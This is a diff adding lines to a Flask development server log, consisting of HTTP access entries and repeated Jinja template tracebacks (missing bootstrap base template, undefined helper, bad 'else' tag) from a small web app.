@@ -2492,3 +2492,559 @@ AttributeError: 'Anonymous' object has no attribute 'id'
 105.154.28.195 - - [06/Aug/2020 08:06:32] "[37mGET / HTTP/1.1[0m" 200 -
 105.154.28.195 - - [06/Aug/2020 08:06:32] "[37mGET / HTTP/1.1[0m" 200 -
 93.175.201.36 - - [06/Aug/2020 08:43:32] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:25:50] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:25:54] "[37mGET /user/mizutani HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:25:55] "[37mGET /user/ HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:28:51] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/dbuser/dblec_app/api/views/user.py", line 255, in showReports
+    return render_template("reports.html", reports=report_schema.dump(report))
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 140, in render_template
+    ctx.app,
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 1090, in render
+    self.environment.handle_exception()
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 832, in handle_exception
+    reraise(*rewrite_traceback_stack(source=source))
+  File "/usr/local/lib/python3.6/site-packages/jinja2/_compat.py", line 28, in reraise
+    raise value.with_traceback(tb)
+  File "/home/dbuser/dblec_app/api/templates/reports.html", line 4, in top-level template code
+    {% extends "bootstrap/base.html" %}
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 60, in get_source
+    return self._get_source_fast(environment, template)
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 89, in _get_source_fast
+    raise TemplateNotFound(template)
+jinja2.exceptions.TemplateNotFound: bootstrap/base.html
+221.115.2.35 - - [06/Aug/2020 09:28:52] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/dbuser/dblec_app/api/views/user.py", line 255, in showReports
+    return render_template("reports.html", reports=report_schema.dump(report))
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 140, in render_template
+    ctx.app,
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 1090, in render
+    self.environment.handle_exception()
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 832, in handle_exception
+    reraise(*rewrite_traceback_stack(source=source))
+  File "/usr/local/lib/python3.6/site-packages/jinja2/_compat.py", line 28, in reraise
+    raise value.with_traceback(tb)
+  File "/home/dbuser/dblec_app/api/templates/reports.html", line 4, in top-level template code
+    {% extends "bootstrap/base.html" %}
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 60, in get_source
+    return self._get_source_fast(environment, template)
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 89, in _get_source_fast
+    raise TemplateNotFound(template)
+jinja2.exceptions.TemplateNotFound: bootstrap/base.html
+221.115.2.35 - - [06/Aug/2020 09:28:52] "[37mGET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:28:52] "[37mGET /?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:28:52] "[37mGET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:28:52] "[37mGET /?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:28:52] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:28:53] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:32] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/dbuser/dblec_app/api/views/user.py", line 255, in showReports
+    return render_template("reports.html", reports=report_schema.dump(report))
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 140, in render_template
+    ctx.app,
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 1090, in render
+    self.environment.handle_exception()
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 832, in handle_exception
+    reraise(*rewrite_traceback_stack(source=source))
+  File "/usr/local/lib/python3.6/site-packages/jinja2/_compat.py", line 28, in reraise
+    raise value.with_traceback(tb)
+  File "/home/dbuser/dblec_app/api/templates/reports.html", line 35, in top-level template code
+    {% for i in range(5 - report.score|int) %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 1, in top-level template code
+    {% block doc -%}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 4, in block "doc"
+    {%- block html %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 6, in block "html"
+    {%- block head %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 13, in block "head"
+    {%- block styles %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 15, in block "styles"
+    <link href="{{bootstrap_find_resource('css/bootstrap.css', cdn='bootstrap')}}" rel="stylesheet">
+jinja2.exceptions.UndefinedError: 'bootstrap_find_resource' is undefined
+221.115.2.35 - - [06/Aug/2020 09:29:32] "[37mGET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:32] "[37mGET /?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:32] "[37mGET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:32] "[37mGET /?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:32] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/dbuser/dblec_app/api/views/user.py", line 255, in showReports
+    return render_template("reports.html", reports=report_schema.dump(report))
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 140, in render_template
+    ctx.app,
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 1090, in render
+    self.environment.handle_exception()
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 832, in handle_exception
+    reraise(*rewrite_traceback_stack(source=source))
+  File "/usr/local/lib/python3.6/site-packages/jinja2/_compat.py", line 28, in reraise
+    raise value.with_traceback(tb)
+  File "/home/dbuser/dblec_app/api/templates/reports.html", line 35, in top-level template code
+    {% for i in range(5 - report.score|int) %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 1, in top-level template code
+    {% block doc -%}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 4, in block "doc"
+    {%- block html %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 6, in block "html"
+    {%- block head %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 13, in block "head"
+    {%- block styles %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 15, in block "styles"
+    <link href="{{bootstrap_find_resource('css/bootstrap.css', cdn='bootstrap')}}" rel="stylesheet">
+jinja2.exceptions.UndefinedError: 'bootstrap_find_resource' is undefined
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/dbuser/dblec_app/api/views/user.py", line 255, in showReports
+    return render_template("reports.html", reports=report_schema.dump(report))
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 140, in render_template
+    ctx.app,
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 1090, in render
+    self.environment.handle_exception()
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 832, in handle_exception
+    reraise(*rewrite_traceback_stack(source=source))
+  File "/usr/local/lib/python3.6/site-packages/jinja2/_compat.py", line 28, in reraise
+    raise value.with_traceback(tb)
+  File "/home/dbuser/dblec_app/api/templates/reports.html", line 35, in top-level template code
+    {% for i in range(5 - report.score|int) %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 1, in top-level template code
+    {% block doc -%}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 4, in block "doc"
+    {%- block html %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 6, in block "html"
+    {%- block head %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 13, in block "head"
+    {%- block styles %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 15, in block "styles"
+    <link href="{{bootstrap_find_resource('css/bootstrap.css', cdn='bootstrap')}}" rel="stylesheet">
+jinja2.exceptions.UndefinedError: 'bootstrap_find_resource' is undefined
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:33] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:34] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:34] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/dbuser/dblec_app/api/views/user.py", line 255, in showReports
+    return render_template("reports.html", reports=report_schema.dump(report))
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 140, in render_template
+    ctx.app,
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 1090, in render
+    self.environment.handle_exception()
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 832, in handle_exception
+    reraise(*rewrite_traceback_stack(source=source))
+  File "/usr/local/lib/python3.6/site-packages/jinja2/_compat.py", line 28, in reraise
+    raise value.with_traceback(tb)
+  File "/home/dbuser/dblec_app/api/templates/reports.html", line 35, in top-level template code
+    {% for i in range(5 - report.score|int) %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 1, in top-level template code
+    {% block doc -%}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 4, in block "doc"
+    {%- block html %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 6, in block "html"
+    {%- block head %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 13, in block "head"
+    {%- block styles %}
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 15, in block "styles"
+    <link href="{{bootstrap_find_resource('css/bootstrap.css', cdn='bootstrap')}}" rel="stylesheet">
+jinja2.exceptions.UndefinedError: 'bootstrap_find_resource' is undefined
+221.115.2.35 - - [06/Aug/2020 09:29:34] "[37mGET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:34] "[37mGET /?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:34] "[37mGET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:34] "[37mGET /?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:34] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:29:34] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:31:28] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:31:28] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:31:50] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:31:51] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:31:51] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:31:51] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:31:51] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:31:52] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:32:02] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:43] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:44] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:45] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:45] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:45] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:46] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:46] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:46] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:47] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:47] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:47] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:47:47] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:48:17] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:48:17] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:49:05] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:49:06] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:49:34] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:53:52] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.6/site-packages/flask_cors/extension.py", line 161, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib64/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib64/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/dbuser/dblec_app/api/views/user.py", line 255, in showReports
+    return render_template("reports.html", reports=report_schema.dump(report))
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 140, in render_template
+    ctx.app,
+  File "/usr/local/lib64/python3.6/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 1090, in render
+    self.environment.handle_exception()
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 832, in handle_exception
+    reraise(*rewrite_traceback_stack(source=source))
+  File "/usr/local/lib/python3.6/site-packages/jinja2/_compat.py", line 28, in reraise
+    raise value.with_traceback(tb)
+  File "/home/dbuser/dblec_app/api/templates/reports.html", line 1, in top-level template code
+    {% extends 'base.html' %}
+  File "/usr/local/lib/python3.6/site-packages/jinja2/environment.py", line 832, in handle_exception
+    reraise(*rewrite_traceback_stack(source=source))
+  File "/usr/local/lib/python3.6/site-packages/jinja2/_compat.py", line 28, in reraise
+    raise value.with_traceback(tb)
+  File "/home/dbuser/dblec_app/api/templates/base.html", line 12, in template
+    {% else %}
+jinja2.exceptions.TemplateSyntaxError: Encountered unknown tag 'else'.
+221.115.2.35 - - [06/Aug/2020 09:53:52] "[37mGET /?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:53:52] "[37mGET /?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:53:52] "[37mGET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:53:52] "[37mGET /?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:53:52] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:53:52] "[37mGET /?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 09:55:36] "[37mGET / HTTP/1.1[0m" 200 -
+221.115.2.35 - - [06/Aug/2020 10:03:16] "[37mGET / HTTP/1.1[0m" 200 -
+5.234.235.225 - - [06/Aug/2020 11:35:10] "[37mGET / HTTP/1.1[0m" 200 -
+73.210.235.40 - - [06/Aug/2020 12:24:08] "[37mGET / HTTP/1.1[0m" 200 -
+41.60.235.83 - - [06/Aug/2020 12:53:26] "[37mGET / HTTP/1.1[0m" 200 -
+37.49.224.168 - - [06/Aug/2020 13:16:27] "[37mGET / HTTP/1.1[0m" 200 -
+195.54.160.21 - - [06/Aug/2020 13:54:29] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
